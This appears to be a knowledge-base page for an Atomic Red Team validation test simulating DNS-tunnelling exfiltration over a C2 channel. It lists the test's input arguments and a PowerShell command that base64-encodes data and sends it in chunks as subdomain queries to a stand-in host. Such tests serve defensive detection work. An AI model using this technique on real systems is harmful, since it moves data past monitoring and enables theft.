---
atomic_guid: "c9207f3e-213d-4cc7-ad2a-7697a7237df9"
title: "Text Based Data Exfiltration using DNS subdomains"
framework: "atomic"
generated: "true"
attack_technique_id: "T1041"
attack_technique_name: "Exfiltration Over C2 Channel"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1041/T1041.yaml"
build_date: "2026-04-26 14:38:39"
executor: "powershell"
aliases:
  - "c9207f3e-213d-4cc7-ad2a-7697a7237df9"
  - "Text Based Data Exfiltration using DNS subdomains"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Text Based Data Exfiltration using DNS subdomains

Simulates an adversary using DNS tunneling to exfiltrate data over a Command and Control (C2) channel.

## Metadata

- Atomic GUID: c9207f3e-213d-4cc7-ad2a-7697a7237df9
- Technique: T1041: Exfiltration Over C2 Channel
- Platforms: windows
- Executor: powershell
- Source Path: atomics/T1041/T1041.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1041-exfiltration_over_c2_channel|T1041]]

## Input Arguments

### chunk_size

- description: Size of each DNS query chunk (in characters).
- type: integer
- default: 63

### dns_server

- description: DNS server IP address or domain name.
- type: url
- default: dns.example.com

### exfiltrated_data

- description: Data to be exfiltrated.
- type: string
- default: SecretDataToExfiltrate

## Executor

- name: powershell

### Command

```powershell
$dnsServer = "#{dns_server}"
$exfiltratedData = "#{exfiltrated_data}"
$chunkSize = #{chunk_size}

$encodedData = [System.Text.Encoding]::UTF8.GetBytes($exfiltratedData)
$encodedData = [Convert]::ToBase64String($encodedData)
$chunks = $encodedData -split "(.{$chunkSize})"

foreach ($chunk in $chunks) {
    $dnsQuery = $chunk + "." + $dnsServer
    Resolve-DnsName -Name $dnsQuery
    Start-Sleep -Seconds 5
}
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1041/T1041.yaml)
